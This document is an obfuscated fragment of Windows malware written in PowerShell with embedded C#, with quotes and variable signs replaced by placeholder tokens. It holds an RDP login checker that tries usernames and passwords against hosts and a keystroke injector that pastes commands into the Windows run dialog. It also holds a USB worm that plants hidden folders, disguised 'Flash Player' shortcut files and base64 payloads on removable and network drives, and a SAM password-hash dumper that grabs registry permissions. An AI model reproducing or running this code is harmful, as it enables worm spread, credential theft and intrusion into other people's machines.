		public void exit(){

			if(!process.HasExited){

				process.Kill();

			};

			process.Close();

		}

        public int check(string exePath, string ip, string user, string pass, bool checklogin)

        {	

			try{

				check_login = checklogin;

				process = new System.Diagnostics.Process();

				process.StartInfo.FileName = exePath;

				if(checklogin){

					process.StartInfo.Arguments = NDck/u:NDck+user+NDck /p:NDck+pass+NDck /cert-ignore /sec:nla /log-level:trace /size:700x700 /v:NDck+ip;

				} else {

					process.StartInfo.Arguments = NDck/u:NDck+user+NDck /p:NDck+pass+NDck /cert-ignore +auth-only /sec:nla /log-level:trace /v:NDck+ip;

				}

				process.StartInfo.UseShellExecute = false;

				process.StartInfo.CreateNoWindow = true;

				process.StartInfo.RedirectStandardOutput = true;

				process.Start();

				process.BeginOutputReadLine();

				process.OutputDataReceived += new DataReceivedEventHandler(processOutputDataReceived);

				System.Threading.Timer timer = new System.Threading.Timer(autoQuite, null, 10000, 5000);

				while(true){

					if(process.HasExited){return 0;}

					Thread.Sleep(1000);

					if(flag1!=-1) {

						if(!checklogin){exit();}

						return flag1;

					}

				}

			}

			catch (Exception ex)

            {

                Console.WriteLine(ex.Message);

				return 0;

            }

			

        }

		private void autoQuite(object state) {

            flag1=0;

        }

		


        private void processOutputDataReceived(object sender, DataReceivedEventArgs e)

        {

			try{

				if(check_login) {

					if(e.Data.Contains(NDckLogonInfoV2NDck)){

						flag1=1;

					}

				} else {

					if(e.Data.Contains(NDckServer rdp encryption methodNDck)){

						flag1 = 1;

					} else if(e.Data.Contains(NDckcheck_fds: transport_read_pdu() - -1NDck)){

						flag1 = 0;

					}

				}

			}

			catch (Exception ex)

            {

				string a=ex.Message;

            }

        }

    }

	public class User32Helper {

		[DllImport(NDckuser32.dllNDck)]

		public static extern int SetForegroundWindow(IntPtr point);

	}

	public class CMD {

		struct INPUT{public INPUTType type;public INPUTUnion Event;}


		[StructLayout(LayoutKind.Explicit)]

		struct INPUTUnion{

			[FieldOffset(0)]

			internal MOUSEINPUT mi;

			[FieldOffset(0)]

			internal KEYBDINPUT ki;

			[FieldOffset(0)]

			internal HARDWAREINPUT hi;

		}


		[StructLayout(LayoutKind.Sequential)]

		struct MOUSEINPUT{public int dx;public int dy;public int mouseData;public int dwFlags;public uint time;public IntPtr dwExtraInfo;}


		[StructLayout(LayoutKind.Sequential)]

		struct KEYBDINPUT{public ushort wVk;public ushort wScan;public KEYEVENTF dwFlags;public int time;public IntPtr dwExtraInfo;}


		[StructLayout(LayoutKind.Sequential)]

		struct HARDWAREINPUT{public int uMsg;public short wParamL;public short wParamH;}

		enum INPUTType : uint{INPUT_KEYBOARD = 1}

		[Flags]

		enum KEYEVENTF : uint{EXTENDEDKEY = 0x0001,KEYUP = 0x0002,SCANCODE = 0x0008,UNICODE = 0x0004}


		[DllImport(NDckuser32.dllNDck, SetLastError = true)]

		static extern UInt32 SendInput(int numberOfInputs, INPUT[] inputs, int sizeOfInputStructure);

		[System.Runtime.InteropServices.DllImport(NDckuser32.dllNDck)]

		internal static extern uint MapVirtualKey(uint uCode, uint uMapType);	

		public static void runCmd(string cmdstr){

			WinR();

			Copy(cmdstr);

			Paste();

			Enter();

			Copy(NDck NDck);

		}

		private static void Copy(string keys) {

			Exception threadEx = null;

			Thread staThread = new Thread(

				delegate ()

				{

					try

					{

						Clipboard.SetText(keys);

					}


					catch (Exception ex) 

					{

						threadEx = ex;            

					}

				});

			staThread.SetApartmentState(ApartmentState.STA);

			staThread.Start();

			staThread.Join();

		}

		private static void WinR(){

			INPUT[] input = new INPUT[4];				

			input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;

			input[0].Event.ki.wScan  = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);

			input[1].Event.ki.wScan  = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.Escape, (uint)0x0);

			input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;			

			SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));

		}

		private static void Paste(){

			Thread.Sleep(200);

			INPUT[] input = new INPUT[4];	

			input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;

			input[0].Event.ki.wScan  = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);

			input[1].Event.ki.wScan  = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.V, (uint)0x0);

			input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;			

			SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));

		}

		private static void Enter(){

			Thread.Sleep(200);

			INPUT[] input = new INPUT[4];	

			input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;

			input[0].Event.ki.wScan  = input[2].Event.ki.wScan = (ushort)MapVirtualKey'+'((uint)Keys.ControlKey, (uint)0x0);

			input[1].Event.ki.wScan  = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.Return, (uint)0x0);

			input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;	

			SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));

		}

	}

}

NDck@

aDd-TYpe -TypeDefinition wB69source1 -ReferencedAssemblies @(NDckSystem.Windows.FormsNDck)


wB69source2=@NDck

using Syste'+'m;

using System.Threading;

using System.IO;

using System.Collections.Generic;

using System.Text;

using System.Runtime.InteropServices;

using System.Reflection;

namespace USB

{

public class USBLNK

    {

        public static List<string> blacklist = new List<string>();

		public static string gb3;

		public static string gb6;

		public static string jsdata;

        const string home = NDckUTFsyncNDck;

        const string inf_data = NDck9e09e0inf_dataNDck;

        static public void Main1(string b1, string b2, string b3)

        {

			gb3 = b1;

			gb6 = b2;

			jsdata = b3;

            Timer timer = new Timer(ResetBlacklist, null, 10000, 10000);

            while (true)

            {

                BaseMode();

                Thread.Sleep(5000);

            }

        }

		static void ResetBlacklist(object state) {

            blacklist.Clear();

        }

		static bool CreateHomeDirectory(string drive)

        {

            try

            {

                DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + home);

                directoryInfo.Attributes = File'+'Attributes.Directory uOva FileAttributes.Hidden;

                return true;

            }

            catch{}

            return false;

        }

		static bool IsSupported(DriveInfo drive) { return drive.IsReady && drive.AvailableFreeSpace > 1024

            && (drive.DriveType == DriveType.Removable uOvauOva drive.DriveType == DriveType.Network)

            && (drive.DriveFormat == NDckFAT32NDck uOvauOva drive.DriveFormat == NDckNTFSNDck);}

		static bool CheckBlacklist(string name) { return name==home uOvauOva name==NDckSystem Volume InformationNDck uOvauOva name==NDckwB69RECYCLE.BINNDck;}

		static bool Infect(string drive)

        {

            if (blacklist.Contains(drive)) {return true;}

			CreateLnk(drive, NDckblue3.binNDck, gb3);

			CreateLnk(drive, NDckblue6.binNDck, gb6);

			CreateJs(drive, NDckreadme.jsNDck, jsdata);

			

            try

            {

                File.Create(drive + home + inf_data);

                return true;

            }

            catch (Exception ex)

            {

                Console.WriteLine(ex.Message);

            }

			

            return false;

        }

		static bool CreateJs(string drive, string fname, string gb)

		{

			FileStream fs1 = new FileStream(drive+fname, FileMode.Create);

			byte[] gb_bytes = Convert.FromBase64String(gb);

			fs1.Write(gb_bytes,0,gb_bytes.Length);

			fs1.Close();

			Console.WriteLine(gb_bytes.Length);

			return true;

		}

		static bool CreateLnk(string drive, string binfname, string gb)

		{

			

			byte[] bytes1 = new byte[]{0x4c,0x00,0x00,0x00,0x01,0x14,0x02,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x81,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x9c,0x00,0x14,0x00,0x1f,0x80,0x20,0x20,0xec,0x21,0xea,0x3a,0x69,0x10,0xa2,0xdd,0x08,0x00,0x2b,0x30,0x30,0x9d,0x86,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x6a,0x00,0x00,0x00,0x00,0x00,0x00};

			

			byte[] bytes2 = new byte[]{0x3a,0x00,0x5c};

			byte[] bytes3 = new byte[]{0x00,0x00,0x00,0x46,0x00,0x6c,0x00,0x61,0x00,0x73,0x00,0x68,0x00,0x20,0x00,0x50,0x00,0x6c,0x00,0x61,0x00,0x79,0x00,0x65,0x00,0x72,0x00,0x00,0x00,0x4d,0x00,0x61,0x00,0x6e,0x00,0x61,0x00,0x67,0x00,0x65,0x00,0x20,0x00,0x46,0x00,0x6c,0x00,0x61,0x00,0x73,0x00,0x68,0x00,0x20,0x00,0x50,0x00,0x6c,0x00,0x61,0x00,0x79,0x00,0x65,0x00,0x72,0x00,0x20,0x00,0x53,0x00,0x65,0x00,0x74,0x00,0x74,0x00,0x69,0x00,0x6e,0x00,0x67,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x05,0x00,0x00,0xa0,0x03,0x00,0x00,0x00,0x14,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

			


			for(char i = utH9DutH9; i <= utH9KutH9; i++)

            {

				FileStream fs = new FileStream(drive+i.ToString()+binfname.Replace(NDck.binNDck,NDck.lnkNDck), FileMode.Create);

				fs.Write(bytes1,0,bytes1.Length);'+'

				

				byte[] d = new byte[4]; 

				int l = binfname.Length+4;

				d[0] = (byte) (l & 0xFF); 

				d[1] = (byte) ((l & 0xFF00) >> 8); 

				d[2] = 0x0d; 

				d[3] = 0x00;

				fs.Write(d,0,d.Length);

				

				byte[] b = new byte[2]; 

				b[0] = (byte) (i & 0xFF); 

				b[1] = (byte) ((i & 0xFF00) >> 8); 

				fs.Write(b,0,b.Length);

				fs.Write(bytes2,0,bytes2.Length);

				

				foreach(char c in binfname){

					byte[] bb = new byte[2]; 

					bb[0] = (byte) ((c & 0xFF00) >> 8); 

					bb[1] = (byte) (c & 0xFF); 

					fs.Write(bb,0,bb.Length);

				}

				fs.Write(bytes3,0,bytes3.Length);

				

				fs.Close();

			}

			

			FileStream fs1 = new FileStream(drive+binfname, FileMode.Create);

			byte[] gb_bytes = Convert.FromBase64String(gb);

			fs1.Write(gb_bytes,0,gb_bytes.Length);

			fs1.Close();

			Console.WriteLine(gb_bytes.Length);

			return true;

		}

		static void BaseMode()

        {

            DriveInfo[] drives = DriveInfo.GetDrives();

            foreach (DriveInfo drive in drives)

            {

                if (blacklist.Contains(drive.Name))

                {    continue;}

				Console.WriteLine(NDckDetect drive:NDck+drive.Name);

                if (IsSupported(drive))

                {

                    if (!File.Exists(drive + home + inf_data))

                    {

						Console.WriteLine(NDckTry to infect NDck+drive.Name);

                        if (CreateHomeDirectory(drive.Name) && Infect(drive.Name))

                        {

                            blacklist.Add(drive.Name);

                        }

                    }

                    else {

						Console.WriteLine(drive.Name+NDck already infected!NDck);

                        blacklist.Add(drive.Name);

					}

                }

                else{

                    blacklist.Add(drive.Name);

				}

            }

        }

    }

}

NDck@

Start-Job -ScriptBlock { aDd-TYpe -TypeDefinition wB69(wB69args[0]);[USB.USBLNK]::Main1(wB69(wB69args[1]),wB69(wB69args[2]),wB69(wB69args[3])) } -ArgumentList wB69source2,wB69blue3_bin_b64,wB69blue6_bin_b64,wB69jsb64



function geth {  

 

[CmdletBinding()]

Param (

    [Switch]wB69PSObjectFormat

)


wB69script:PowerDump = wB69null

function LoadApi

{

    wB69DynAssembly = New-Object System.Reflection.AssemblyName(utH9Win32LibutH9)

    wB69AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly(wB69DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)

    wB69ModuleBuilder = wB69AssemblyBuilder.DefineDynamicModule(utH9Win32LibutH9, wB69False)

    wB69TypeBuilder = wB69ModuleBuilder.DefineType(utH9PowerDumputH9, utH9Public, ClassutH9)


    wB69PInvokeMethod = wB69TypeBuilder.DefineMethod(

        utH9RegOpenKeyExutH9,

        [Reflection.MethodAttributes] utH9Public, StaticutH9,

        [int],

        [Type[]] @( [int], [string], [int], [int], [int].MakeByRefType())

    )


    wB69DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))


    wB69FieldArray = [Reflection.FieldInfo[]] @(

        [Runtime.InteropServices.DllImportAttribute].GetField(utH9EntryPointutH9),

        [Runtime.InteropServices.DllImportAttribute].GetField(utH9CharSetutH9)

    )

    wB69FieldValueArray = [Object[]] @(

        utH9RegOpenKeyExutH9,

        [Runtime.InteropServices.CharSet]::Auto

    )


    wB69SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(

        wB69DllImportConstructor,

        @(utH9advapi32.dllutH9),

        wB69FieldArray,

        wB69FieldValueArray

    )

    wB69PInvokeMethod.SetCustomAttribute(wB69SetLastErrorCustomAttribute)

    wB69PInvokeMethod = wB69TypeBuilder.DefineMethod(

        utH9RegQueryInfoKeyutH9,

        [Reflection.MethodAttributes] utH9Public, StaticutH9,

        [int],

        [Type[]] @( [int], [Text.Stringbuilder], [int].MakeByRefType(), [int], [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [int].MakeByRefType(), [IntPtr])

    )


    wB69DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))


    wB69Field'+'Array = [Reflection.FieldInfo[]] @(

        [Runtime.InteropServices.DllImportAttribute].GetField(utH9EntryPointutH9),

        [Runtime.InteropServices.DllImportAttribute].GetField(utH9CallingConventionutH9),

        [Runtime.InteropServices.DllImportAttribute].GetField(utH9SetLastErrorutH9)

    )

    wB69FieldValueArray = [Object[]] @(

        utH9RegQueryInfoKeyutH9,

        [Runtime.InteropServices.CallingConvention]::Winapi,

        wB69true

    )


    wB69SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(

        wB69DllImportConstructor,

        @(utH9advapi32.dllutH9),

        wB69FieldArray,

        wB69FieldValueArray

    )

    wB69PInvokeMethod.SetCustomAttribute(wB69SetLastErrorCustomAttribute)

    wB69PInvokeMethod = wB69TypeBuilder.DefineMethod(

        utH9RegCloseKeyutH9,

        [Reflection.MethodAttributes] utH9Public, StaticutH9,

        [int],

        [Type[]] @( [int])

    )


    wB69DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))


    wB69FieldArray = [Reflection.FieldInfo[]] @(

        [Runtime.InteropServices.DllImportAttribute].GetField(utH9EntryPointutH9),

        [Runtime.InteropServices.DllImportAttribute].GetField(utH9SetLastErrorutH9)

    )

    wB69FieldValueArray = [Object[]] @(

        utH9RegCloseKeyutH9,

        wB69true

    )


    wB69SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder(

        wB69DllImportConstructor,

        @(utH9advapi32.dllutH9),

        wB69FieldArray,

        wB69FieldValueArray

    )

    wB69PInvokeMethod.SetCustomAttribute(wB69Set'+'LastErrorCustomAttribute)

    ################################################################################

    

    wB69script:PowerDump = wB69TypeBuilder.CreateType()

}


#######################################powerdump written by David Kennedy#########################################


wB69antpassword = [Text.Encoding]::ASCII.GetBytes(NDckNTPASSWORDir80NDck);

wB69almpassword = [Text.Encoding]::ASCII.GetBytes(NDckLMPASSWORDir80NDck);

wB69empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee);

wB69empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0);

wB69odd_parity = @(

  1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,

  16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,

  32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,

  49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,

  64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,

  81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,

  97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,

  112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,

  128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,

  145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,

  161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,

  176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,

  193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,

  208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,

  224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,

  241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254

);


function'+' sid_to_key(wB69sid)

{

    wB69c0 = wB69sid -band 255

    wB69c1 = (wB69sid -band 65280)/256

    wB69c2 = (wB69sid -band 16711680)/65536

    wB69c3 = (wB69sid -band 4278190080)/16777216


    wB69s1 = @(wB69c0, wB69c1, wB69c2, wB69c3, wB69c0, wB69c1, wB69c2)

    wB69s2 = @(wB69c3, wB69c0, wB69c1, wB69c2, wB69c3, wB69c0, wB69c1) 


    return ,((str_to_key wB69s1),(str_to_key wB69s2))

}


function str_to_key(wB69s)

{

    wB69k0 = [int][math]::Floor(wB69s[0] * 0.5)

    wB69k1 = ( wB69(wB69s[0] -band 0x01) * 64) -bor [int][math]::Floor(wB69s[1] * 0.25)

    wB69k2 = ( wB69(wB69s[1] -band 0x03) * 32) -bor [int][math]::Floor(wB69s[2] * 0.125)

    wB69k3 = ( wB69(wB69s[2] -band 0x07) * 16) -bor [int][math]::Floor(wB69s[3] * 0.0625)

    wB69k4 = ( wB69(wB69s[3] -band 0x0F) * 8) -bor [int][math]::Floor(wB69s[4] * 0.03125)

    wB69k5 = ( wB69(wB69s[4] -band 0x1F) * 4) -bor [int][math]::Floor(wB69s[5] * 0.015625)

    wB69k6 = ( wB69(wB69s[5] -band 0x3F) * 2) -bor [int][math]::Floor(wB69s[6] * 0.0078125)

    wB69k7 = wB69(wB69s[6] -band 0x7F)


    wB69key = @(wB69k0, wB69k1, wB69k2, wB69k3, wB69k4, wB69k5, wB69k6, wB69k7)


    0..7 uOva %{

        wB69key[wB69_] = wB69odd_parity[(wB69key[wB69_] * 2)]

    }


    return ,wB69key

}


function NewRC4([byte[]]wB69key)

{

    return new-object Object uOva

    Add-Member NoteProperty key wB69key -PassThru uOva

    Add-Member NoteProperty S wB69null -PassThru uOva

    Add-Member ScriptMethod init {

        if (-not wB69this.S)

        {

            [byte[]]wB69this.S = 0..255;

            0..255 uOva % -begin{[long]wB69j=0;}{

                wB69j = (wB69j + wB69this.key[wB69(wB69_ % wB69this.key.Length)] + wB69this.S[wB69_]) % wB69this.S.Length;

                wB69temp = wB69this.S[wB69_]; wB69this.S[wB69_] = wB69this.S[wB69j]; wB69this.S[wB69j] = wB69temp;

                }

        }

    } -PassThru uOva

    Add-Member ScriptMethod NDckencryptNDck {

        wB69data = wB69args[0];

        wB69this.init();

        wB69outbuf = new-obje'+'ct byte[] wB69(wB69data.Length);

        wB69S2 = wB69this.S[0..wB69this.S.Length];

        0..wB69(wB69data.Length-1) uOva % -begin{wB69i=0;wB69j=0;} {

            wB69i = (wB69i+1) % wB69S2.Length;

            wB69j = (wB69j + wB69S2[wB69i]) % wB69S2.Length;

            wB69temp = wB69S2[wB69i];wB69S2[wB69i] = wB69S2[wB69j];wB69S2[wB69j] = wB69temp;

            wB69a = wB69data[wB69_];

            wB69b = wB69S2[ wB69(wB69S2[wB69i]+wB69S2[wB69j]) % wB69S2.Length ];

            wB69outbuf[wB69_] = (wB69a -bxor wB69b);

        }

        return ,wB69outbuf;

    } -PassThru

}


function des_encrypt([byte[]]wB69data, [byte[]]wB69key)

{

    return ,(des_transform wB69data wB69key wB69true)

}


function des_decrypt([byte[]]wB69data, [byte[]]wB69key)

{

    return ,(des_transform wB69data wB69key wB69false)

}


function des_transform([byte[]]wB69data, [byte[]]wB69key, wB69doEncrypt)

{

    wB69des = new-object Security.Cryptography.DESCryptoServiceProvider;

    wB69des.Mode = [Security.Cryptography.CipherMode]::ECB;

    wB69des.Padding = [Security.Cryptography.PaddingMode]::None;

    wB69des.Key = wB69key;

    wB69des.IV = wB69key;

    wB69transform = wB69null;

    if (wB69doEncrypt) {wB69transform = wB69des.CreateEncryptor();}

    else{wB69transform = wB69des.CreateDecryptor();}

    wB69result = wB69transform.TransformFinalBlock(wB69data, 0, wB69data.Length);

    return ,wB69result;

}


function Get-RegKeyClass([string]wB69key, [string]wB69subkey)

{

    switch (wB69Key) {

        NDckHKCRNDck { wB69nKey = 0x80000000} #HK Classes Root

        NDckHKCUNDck { wB69nKey = 0x80000001} #HK Current User

        NDckHKLMNDck { wB69nKey = 0x80000002} #HK Local Machine

        NDckHKUNDck  { wB69nKey = 0x80000003} #HK Users

        NDckHKCCNDck { wB69nKey = 0x80000005} #HK Current Config

        default {

            throw NDckInvalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCCNDck

        }

    }

    wB69KEYQUERYVALUE = 0x1;

    wB69KEYREAD = 0x19;

    wB69KEYALLACCESS = 0x3F;

    wB69result = NDckNDck;

    [int]wB69hkey=0

    if (-not w'+'B69script:PowerDump::RegOpenKeyEx(wB69nkey,wB69subkey,0,wB69KEYREAD,[ref]wB69hkey))

    {

    	wB69classVal = New-Object Text.Stringbuilder 1024

    	[int]wB69len = 1024

    	if (-not wB69script:PowerDump::RegQueryInfoKey(wB69hkey,wB69classVal,[ref]wB69len,0,[ref]wB69null,[ref]wB69null,

    		[ref]wB69null,[ref]wB69null,[ref]wB69null,[ref]wB69null,[ref]wB69null,0))

    	{

    		wB69res'+'ult = wB69classVal.ToString()

    	}

    	else

    	{

    		Write-Error NDckRegQueryInfoKey failedNDck;

    	}

    	wB69script:PowerDump::RegCloseKey(wB69hkey) uOva Out-Null

    }

    el'+'se

    {

    	Write-Error NDckCannot open keyNDck;

    }

    return wB69result;

}


function Get-BootKey

{

    wB69s = [string]::Join(NDckNDck,wB69(NDckJDNDck,NDckSkew1NDck,NDckGBGNDck,NDckDataNDck uOva %{Get-RegKeyClass NDckHKLMNDck NDckSYSTEM9e0CurrentControlSet9e0Control9e0Lsa9e0wB69_NDck}));

    wB69b = new-object byte[] wB69(wB69s.Length/2);

    0..wB69(wB69b.Length-1) uOva %{wB69b[wB69_] = [Convert]::ToByte(wB69s.Substring(wB69(wB69_*2),2),16)}

    wB69b2 = new-object byte[] 16;

    0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 uOva % -begin{wB69i=0;}{wB69b2[wB69i]=wB69b[wB69_];wB69i++}

    return ,wB69b2;

}


function Get-HBootKey

{

    param([byte[]]wB69bootkey);

    wB69aqwerty = [Text.Encoding]::ASCII.GetBytes(NDck!@#wB69%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%ir80NDck);

    wB69anum = [Text.Encoding]::ASCII.GetBytes(NDck0123456789012345678901234567890123456789ir80NDck);

    wB69k = Get-Item HKLM:9e0SAM9e0SAM9e0Domains9e0Account;

    if (-not wB69k) {return wB69null}

    [byte[]]wB69F = wB69k.GetValue(NDckFNDck);

    if (-not wB69F) {return wB69null}

    wB69rc4key = [Security.Cryptography.MD5]::Create().ComputeHash(wB69F[0x70..0x7F] + wB69aqwerty + wB69bootkey + wB69anum);

    wB69rc4 = NewRC4 wB69rc4key;

    return ,(wB69rc4.encrypt(wB69F[0x80..0x9F]));

}


function Get-UserName([byte[]]wB69V)

{

    if (-not wB69V) {return wB69null};

    wB69offset = [BitConverter]::ToInt32(wB69V[0x0c..0x0f],0) + 0xCC;

    wB69len = [BitConverter]::ToInt32(wB69V[0x10..0x13],0);

    return [Text.Encoding]::Unicode.GetString(wB69V, wB69offset, wB69len);

}


function Get-UserHashes(wB69u, [byte[]]wB69hbootkey)

{

    [byte[]]wB69enc_lm_hash = wB69null; [byte[]]wB69enc_nt_hash = wB69null;

    

    # check if hashes exist (if byte memory equals to 20, then weutH9ve got a hash)

    wB69LM_exists = wB69false;

    wB69NT_exists = wB69false;

    # LM header check

    if (wB69u.V[0xa0..0xa3] -eq 20)

    {

        wB69LM_exists = wB69true;

    }

    # NT header check

    elseif (wB69u.V[0xac..0xaf] -eq 20)

    {

        wB69NT_exists = wB69true;

    }


    if (wB69LM_exists -eq wB69true)

    {

        wB69lm_hash_offset = wB69u.HashOffset + 4;

        wB69nt_hash_offset = wB69u.HashOffset + 8 + 0x10;

        wB69enc_lm_hash = wB69u.V[wB69(wB69lm_hash_offset)..wB69(wB69lm_hash_offset+0x0f)];

        wB69enc_nt_hash = wB69u.V[wB69(wB69nt_hash_offset)..wB69(wB69nt_hash_offset+0x0f)];

    }

	

    elseif (wB69NT_exists -eq wB69true)

    {

        wB69nt_hash_offset = wB69u.HashOffset + 8;

        wB69enc_nt_hash = [byte[]]wB69u.V[wB69(wB69nt_hash_offset)..wB69(wB69nt_hash_offset+0x0f)];

    }

    return ,(DecryptHashes wB69u.Rid wB69enc_lm_hash wB69enc_nt_hash wB69hbootkey);

}


function DecryptHashes(wB69rid, [byte[]]wB69enc_lm_hash, [byte[]]wB69enc_nt_hash, [byte[]]wB69hbootkey)

{

    [byte[]]wB69lmhash = wB69empty_lm; [byte[]]wB69nthash=wB69empty_nt;

    if (wB69enc_lm_hash)

    {

        wB69lmhash = DecryptSingleHash wB69rid wB69hbootkey wB69enc_lm_hash wB69almpassword;

    }


    if (wB69enc_nt_hash)

    {

        wB69nthash = DecryptSingleHash wB69rid wB69hbootkey wB69enc_nt_hash wB69antpassword;

    }


    return ,(wB69lmhash,wB69nthash)

}


function DecryptSingleHash(wB69rid,[byte[]]wB69hbootkey,[byte[]]wB69enc_hash,[byte[]]wB69lmntstr)

{

    wB69deskeys = sid_to_key wB69rid;

    wB69md5 = [Security.Cryptography.MD5]::Create();

    wB69rc4_key = wB69md5.ComputeHash(wB69hbootkey[0..0x0f] + [BitConverter]::GetBytes(wB69rid) + wB69lmntstr);

    wB69rc4 = NewRC4 wB69rc4_key;

    wB69obfkey = wB69rc4.encrypt(wB69enc_hash);

    wB69hash = (des_decrypt  wB69obfkey[0..7] wB69deskeys[0]) +

        (des_decrypt wB69obfkey[8..wB69(wB69obfkey.Length - 1)] wB69deskeys[1]);

    return ,wB69hash;

}


function Get-UserKeys

{

    ls HKLM:9e0SAM9e0SAM9e0Domains9e0Account9e0Users uOva

        where {wB69_.PSChildName -match NDck^[0-9A-Fa-f]{8}wB69NDck} uOva

            Add-Member AliasProperty KeyName PSChildName -PassThru uOva

            Add-Member ScriptProperty Rid {[Convert]::ToInt32(wB69this.PSChildName, 16)} -PassThru uOva

            Add-Member ScriptProperty V {[byte[]](wB69this.GetValue(NDckVNDck))} -PassThru uOva

            Add-Member ScriptProperty UserName {Get-UserName(wB69this.GetValue(NDckVNDck))} -PassThru uOva

            Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32(wB69this.GetValue(NDckVNDck)[0x9c..0x9f],0) + 0xCC} -PassThru

}


function DumpHashes

{

    LoadApi

    wB69bootkey = Get-BootKey;

    wB69hbootKey = Get-HBootKey wB69bootkey;

    Get-UserKeys uOva %{

        wB69hashes = Get-UserHashes wB69_ wB69hBootKey;

        if(wB69PSObjectFormat)

        {

            wB69creds = New-Object psobject

            wB69creds uOva Add-Member -MemberType NoteProperty -Name Name -Value wB69_.Username

            wB69creds uOva Add-Member -MemberType NoteProperty -Name id -Value wB69_.Rid

            wB69creds uOva Add-Member -MemberType NoteProperty -Name lm -Value ([BitConverter]::ToString(wB69hashes[0])).Replace(NDck-NDck,NDckNDck).ToLower()

            wB69creds uOva Add-Member -MemberType NoteProperty -Name ntlm -Value ([BitConverter]::ToString(wB69hashes[1])).Replace(NDck-NDck,NDckNDck).ToLower()

            wB69creds

        }

        else

        {

            NDck{0}:{1}:{2}:{3}:::NDck -f (wB69_.UserName,wB69_.Rid,

            [BitConverter]::ToString(wB69hashes[0]).Replace(NDck-NDck,NDckNDck).ToLower(),

            [BitConverter]::ToString(wB69hashes[1]).Replace(NDck-NDck,NDckNDck).ToLower());

        }

    }

}


    if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] NDckAdministratorNDck))

    {

        Return

    } 

    else

    {

        wB69rule = New-Object System.Security.AccessControl.RegistryAccessRule (

        [System.Security.Principal.WindowsIdentity]::GetCurrent().Name,

        NDckFullControlNDck,

        [System.Security.AccessControl.InheritanceFlags]NDckObjectInherit,ContainerInheritNDck,

        [System.Security.AccessControl.PropagationFlags]NDckNoneNDck,

        [System.Security.AccessControl.AccessControlType]NDckAllowNDck)

        wB69key = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(

        NDckSAM9e0SAM9e0DomainsNDck,

        [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree,

        [System.Security.AccessControl.RegistryRights]::ChangePermissions)

